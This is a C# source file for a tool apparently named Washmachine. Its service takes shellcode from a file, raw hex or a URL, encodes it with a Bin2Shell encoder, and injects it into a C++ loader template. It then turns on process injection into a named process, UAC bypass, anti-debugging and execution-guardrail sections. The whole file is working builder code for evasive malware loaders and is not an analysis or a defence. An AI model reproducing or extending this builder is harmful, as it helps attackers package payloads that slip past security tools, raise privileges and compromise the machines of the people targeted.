using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

public sealed class CompilerService : ICompilerService
{
    private readonly IAppPaths _paths;
    private readonly IBin2ShellRunner _bin2ShellRunner;
    private readonly ICppSectionEditor _cppEditor;
    private readonly IAppLogger _logger;

    public CompilerService(
        IAppPaths paths,
        IBin2ShellRunner bin2ShellRunner,
        ICppSectionEditor cppEditor,
        IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _bin2ShellRunner = bin2ShellRunner ?? throw new ArgumentNullException(nameof(bin2ShellRunner));
        _cppEditor = cppEditor ?? throw new ArgumentNullException(nameof(cppEditor));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    public async Task<CompilerResult> CompileAsync(UiData data, CancellationToken cancellationToken = default)
    {
        if (data == null) throw new ArgumentNullException(nameof(data));

        ValidateEnvironment();

        var notes = new List<string>();

        try
        {
            RefreshMainCpp(notes);

            var source = DetermineShellcodeSource(data);
            await ApplyShellcodeAsync(data, source, notes, cancellationToken).ConfigureAwait(false);

            ApplyFeatureSelections(data, notes);

            notes.Add("Native project files updated. Run the C++ build separately to produce an executable.");
            return new CompilerResult(true, null, notes);
        }
        catch (OperationCanceledException)
        {
            _logger.Warn("Compilation cancelled by user.");
            notes.Add("Compilation cancelled.");
            return new CompilerResult(false, null, notes);
        }
        catch (Exception ex)
        {
            _logger.Error($"Compilation failed: {ex.Message}");
            notes.Add(ex.Message);
            return new CompilerResult(false, null, notes);
        }
    }

    private void ValidateEnvironment()
    {
        var errors = _paths.Validate();
        if (errors.Count == 0)
            return;

        foreach (var error in errors)
        {
            _logger.Error(error);
        }

        throw new InvalidOperationException("Required project assets are missing.");
    }

    private void RefreshMainCpp(ICollection<string> notes)
    {
        var templatePath = _paths.TemplateCppFile;
        var mainPath = _paths.MainCppFile;

        if (!File.Exists(templatePath))
            throw new FileNotFoundException("template.cpp not found.", templatePath);

        var backupDir = Path.Combine(_paths.MainCppDirectory, "maincpp_backups");
        Directory.CreateDirectory(backupDir);

        if (File.Exists(mainPath))
        {
            var backupName = $"main_{DateTime.Now:yyyyMMdd_HHmmss}.cpp";
            var backupPath = Path.Combine(backupDir, backupName);
            File.Copy(mainPath, backupPath, overwrite: true);
            notes.Add($"Existing main.cpp backed up to {backupPath}.");
            _logger.Info($"Previous main.cpp backed up to {backupPath}.");
        }

        File.Copy(templatePath, mainPath, overwrite: true);
        notes.Add("main.cpp refreshed from template.");
        _logger.Ok("main.cpp refreshed from template.");
    }

    private async Task ApplyShellcodeAsync(
        UiData data,
        ShellcodeSource source,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        switch (source.Kind)
        {
            case ShellcodeSourceKind.None:
                _logger.Warn("No shellcode source supplied; using template defaults.");
                notes.Add("No external shellcode supplied; template defaults remain.");
                break;

            case ShellcodeSourceKind.File:
                await EncodeShellcodeFromFileAsync(source.Value, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Raw:
                string savedPath = SaveRawHexToBin(source.Value);
                notes.Add($"Raw shellcode saved to {savedPath}.");
                await EncodeShellcodeFromFileAsync(savedPath, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Url:
                InjectUrlShellcode(source.Value, notes);
                break;
        }
    }

    private async Task EncodeShellcodeFromFileAsync(
        string filePath,
        UiData data,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("Shellcode file not found.", filePath);

        var args = BuildBin2ShellArguments(data, filePath);
        _logger.Info($"Bin2Shell command: python main.py {string.Join(" ", args.Select(QuoteArg))}");

        string encoded = await _bin2ShellRunner
            .RunAsync(args, cancellationToken: cancellationToken)
            .ConfigureAwait(false);

        if (string.IsNullOrWhiteSpace(encoded))
            throw new InvalidOperationException("Bin2Shell returned empty output.");

        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "/*encodedshellcode*/", encoded, backup: false);
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "unsigned int code_blob_len = 0;", string.Empty, backup: false);

        notes.Add("Encoded shellcode injected into main.cpp.");
        _logger.Ok("Encoded shellcode injected into main.cpp.");
    }

    private void InjectUrlShellcode(string url, ICollection<string> notes)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL value is required.", nameof(url));

        _logger.Info($"Embedding shellcode download URL: {url}");
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "//URLSHELL ", string.Empty, backup: false);
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "$shellurl$", url, backup: false);
        notes.Add("Shellcode URL embedded into main.cpp.");
        _logger.Ok("Shellcode URL embedded.");
    }

    private void ApplyFeatureSelections(UiData data, ICollection<string> notes)
    {
        if (TryGetNonEmpty(data.ComboBoxes, "genericShellcodeComboBox", out var genericShellcode))
        {
            LogSectionUpdate("GENERICSHELLCODE", genericShellcode, notes);
        }

        if (TryGetNonEmpty(data.ComboBoxes, "guardrailComboBox", out var guardrail))
        {
            LogSectionUpdate("GUARDRAIL", guardrail, notes);
        }

        if (TryGetNonEmpty(data.ComboBoxes, "psInjComboBox", out var processInjection))
        {
            if (!data.TextBoxes.TryGetValue("PsInjPsNameTextBox", out var psName) || string.IsNullOrWhiteSpace(psName))
                throw new InvalidOperationException("Process injection requires a target process name.");

            if (LogSectionUpdate("PSINJECTION", processInjection, notes))
            {
                _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "$psname$", psName.Trim(), backup: false);
                _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "/*INJ ", string.Empty, backup: false);
                _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "INJ*/", string.Empty, backup: false);
                notes.Add($"Process injection target set to {psName.Trim()}.");
            }
        }

        if (TryGetNonEmpty(data.ComboBoxes, "shellcodeExecutionComboBox", out var execution))
        {
            LogSectionUpdate("SHELLCODEEXECUTION", execution, notes);
        }

        if (TryGetNonEmpty(data.ComboBoxes, "UACBComboBox", out var uacBypass))
        {
            LogSectionUpdate("UACB", uacBypass, notes);
        }

        if (data.ListBoxes.TryGetValue("antiDebugListBox", out var antiDebugSelections) && antiDebugSelections.Count > 0)
        {
            foreach (var selection in antiDebugSelections.Where(s => !string.IsNullOrWhiteSpace(s)))
            {
                if (LogSectionUpdate("ANTIDEBUGGING", selection, notes))
                    continue;

                _logger.Warn($"Anti-debugging method '{selection}' not found in template section.");
            }
        }
    }

    private bool LogSectionUpdate(string section, string method, ICollection<string> notes)
    {
        if (string.IsNullOrWhiteSpace(method))
            return false;

        bool changed = _cppEditor.UncommentMethodInSection(_paths.MainCppFile, section, method);
        if (changed)
        {
            notes.Add($"Enabled {section}:{method}.");
            _logger.Ok($"Enabled {section}:{method}.");
        }
        else
        {
            _logger.Warn($"Unable to find method '{method}' in section '{section}'.");
        }

        return changed;
    }

    private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
    {
        var args = new List<string> { "-y", _paths.Bin2ShellAlgos };

        if (TryParseIndex(data, "bin2hexEncoder", out int encoder))
        {
            args.Add("-e");
            args.Add(encoder.ToString(CultureInfo.InvariantCulture));
        }

        if (TryParseIndex(data, "bin2hexCompressor", out int compressor))
        {
            args.Add("-c");
            args.Add(compressor.ToString(CultureInfo.InvariantCulture));
        }

        if (TryParseIndex(data, "bin2hexEnvelope", out int envelope))
        {
            args.Add("-env");
            args.Add(envelope.ToString(CultureInfo.InvariantCulture));
        }

        args.Add(shellcodeFile);
        return args;
    }

    private static bool TryParseIndex(UiData data, string key, out int index)
    {
        index = 0;
        return data.ComboBoxes.TryGetValue(key, out var raw) && TryParseIndex(raw, out index) && index > 0;
    }

    private static bool TryParseIndex(string? raw, out int index)
    {
        index = 0;
        if (string.IsNullOrWhiteSpace(raw))
            return false;

        raw = raw.Trim();

        int idxEq = raw.IndexOf("Index", StringComparison.OrdinalIgnoreCase);
        if (idxEq >= 0)
        {
            int eqPos = raw.IndexOf('=', idxEq);
            if (eqPos > idxEq)
            {
                int i = eqPos + 1;
                while (i < raw.Length && char.IsWhiteSpace(raw[i])) i++;
                int j = i;
                while (j < raw.Length && char.IsDigit(raw[j])) j++;
                if (j > i && int.TryParse(raw.AsSpan(i, j - i), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                    return true;
            }
        }

        int dash = raw.IndexOf('-');
        string head = (dash >= 0 ? raw[..dash] : raw).Trim();
        if (int.TryParse(head, NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
            return true;

        for (int k = 0; k < raw.Length; k++)
        {
            if (!char.IsDigit(raw[k])) continue;
            int start = k;
            int end = k;
            while (end < raw.Length && char.IsDigit(raw[end])) end++;
            if (int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
            k = end;
        }

        index = 0;
        return false;
    }

    private static bool TryGetNonEmpty(IDictionary<string, string> source, string key, out string value)
    {
        value = string.Empty;
        if (!source.TryGetValue(key, out var raw) || string.IsNullOrWhiteSpace(raw))
            return false;

        value = raw.Trim();
        return value.Length > 0;
    }

    private ShellcodeSource DetermineShellcodeSource(UiData data)
    {
        data.TextBoxes.TryGetValue("shellcodeFile", out var filePathRaw);
        data.TextBoxes.TryGetValue("shellcodeRAW", out var rawInput);
        data.TextBoxes.TryGetValue("shellcodeURL", out var urlInput);

        bool hasFile = !string.IsNullOrWhiteSpace(filePathRaw);
        bool hasRaw = !string.IsNullOrWhiteSpace(rawInput);
        bool hasUrl = !string.IsNullOrWhiteSpace(urlInput);

        int selected = new[] { hasFile, hasRaw, hasUrl }.Count(x => x);

        if (selected == 0)
            return new ShellcodeSource(ShellcodeSourceKind.None, string.Empty);
        if (selected > 1)
            throw new InvalidOperationException("Multiple shellcode sources detected. Provide only one.");

        if (hasFile) return new ShellcodeSource(ShellcodeSourceKind.File, filePathRaw!.Trim());
        if (hasRaw) return new ShellcodeSource(ShellcodeSourceKind.Raw, rawInput!.Trim());
        return new ShellcodeSource(ShellcodeSourceKind.Url, urlInput!.Trim());
    }

    private string SaveRawHexToBin(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            throw new ArgumentException("Raw hex input is required.", nameof(raw));

        byte[] bytes;
        var matches = Regex.Matches(raw, @"\\x([0-9A-Fa-f]{2})");
        if (matches.Count > 0)
        {
            bytes = new byte[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                bytes[i] = Convert.ToByte(matches[i].Groups[1].Value, 16);
            }
        }
        else
        {
            var hexOnly = new string(raw.Where(Uri.IsHexDigit).ToArray());
            if (hexOnly.Length == 0)
                throw new FormatException("Input does not appear to be hex-encoded.");
            if (hexOnly.Length % 2 != 0)
                throw new FormatException("Hex input must contain an even number of digits.");

            bytes = new byte[hexOnly.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hexOnly.Substring(i * 2, 2), 16);
            }
        }

        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(bytes);
        var sb = new StringBuilder(hash.Length * 2);
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));
        string hashHex = sb.ToString();

        string dir = _paths.EnsureTempShellcodeDirectory();
        string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss", CultureInfo.InvariantCulture);
        string fileName = $"{hashHex}_{timestamp}.bin";
        string path = Path.Combine(dir, fileName);

        File.WriteAllBytes(path, bytes);
        _logger.Ok($"Raw shellcode persisted to {path}.");
        return path;
    }

    private static string QuoteArg(string value)
    {
        if (string.IsNullOrEmpty(value))
            return "\"\"";

        return value.IndexOfAny(new[] { ' ', '\t', '"' }) >= 0
            ? $"\"{value.Replace("\"", "\\\"")}\""
            : value;
    }

    private sealed record ShellcodeSource(ShellcodeSourceKind Kind, string Value);

    private enum ShellcodeSourceKind
    {
        None,
        File,
        Raw,
        Url
    }
}
